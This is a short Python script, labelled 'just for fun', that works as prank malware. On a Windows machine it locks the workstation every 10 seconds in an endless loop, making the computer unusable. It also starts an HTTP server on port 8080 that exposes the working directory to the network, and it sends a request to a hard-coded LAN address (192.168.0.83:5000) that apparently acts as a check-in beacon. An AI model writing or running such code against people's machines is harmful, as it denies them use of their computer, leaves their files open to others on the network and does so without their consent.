import os
import threading
import time

import requests

"""
***********************************     JUST FOR FUN STUFF      ***********************************
"""


def executeServer():
    os.system("python -m http.server 8080")


if __name__ == '__main__':
    os.system("Rundll32.exe user32.dll,LockWorkStation")
    thread = threading.Thread(target=executeServer)
    thread.start()
    try:
        requests.get("http://192.168.0.83:5000")
    except:
        pass
    while True:
        time.sleep(10)
        os.system("Rundll32.exe user32.dll,LockWorkStation")
